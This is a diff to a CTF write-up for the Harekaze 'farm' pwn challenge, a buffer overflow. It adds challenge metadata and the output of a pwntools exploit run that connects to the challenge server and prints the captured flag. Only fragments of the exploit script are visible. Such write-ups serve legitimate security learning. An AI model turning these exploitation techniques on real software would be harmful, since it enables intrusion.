@@ -6,7 +6,9 @@ title: "farm"
 
 In Harekaze Farm, some animas is living. Let’s find them!
 
-[harekaze_farm](https://problem.harekaze.com/32536dfc77c33d38f0a7d40210eee3b7d2547955ab6ae9f1eb92defaf59371a3/harekaze_farm/harekaze_farm)
+file: [harekaze_farm](https://problem.harekaze.com/32536dfc77c33d38f0a7d40210eee3b7d2547955ab6ae9f1eb92defaf59371a3/harekaze_farm/harekaze_farm)
+
+(Pwn, 100 points)
 
 this challenge was a less trivial buffer overflow than im used to seeing in ctf!
 
@@ -164,7 +166,7 @@ def getpipe():
         return process('./harekaze_farm')
 
 r = getpipe()
-#raw_input('> ')
+
 gdbscript = '''
 b *0x00400aca
 c
@@ -183,4 +185,14 @@ r.sendline('hen')
 r.interactive()
 
 r.close()
+
+'''
+[+] Opening connection to problem.harekaze.com on port 20328: Done
+[+] Opening connection to problem.harekaze.com on port 20328: Done
+[*] Switching to interactive mode
+Begin to parade!
+sheep: "baa" "baa"
+isoroku: "flag is here" "flag is here"
+HarekazeCTF{7h1s_i5_V3ry_B3ginning_BoF}
+'''
 ```
